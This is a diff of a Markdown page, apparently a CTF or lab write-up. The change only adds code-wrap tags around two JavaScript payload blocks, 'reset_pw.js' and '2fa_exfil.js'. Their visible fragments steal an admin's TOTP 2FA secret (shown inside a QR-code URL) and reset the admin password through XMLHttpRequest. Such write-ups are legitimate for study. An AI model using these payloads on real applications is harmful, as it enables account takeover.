@@ -30,6 +30,7 @@ layout:
 
 #### 2fa_exfil.js
 
+{% code overflow="wrap" %}
 ```js
 // Extract 2fa code from admin, can then generate QR code for GAuth (update the secret)
 // https://www.google.com/chart?chs=200x200&chld=M%7C0&cht=qr&chl=otpauth://totp/Fort%20Knox:admin?secret=APJ5VXIQVMM5UF6X&issuer=Fort%20Knox
@@ -44,9 +45,11 @@ xhr.onload = function () {
 };
 xhr.send();
 ```
+{% endcode %}
 
 #### reset_pw.js
 
+{% code overflow="wrap" %}
 ```js
 // Reset admin password
 var http = new XMLHttpRequest();
@@ -70,3 +73,4 @@ http.setRequestHeader("Content-type", "application/json");
 
 http.send(data);
 ```
+{% endcode %}
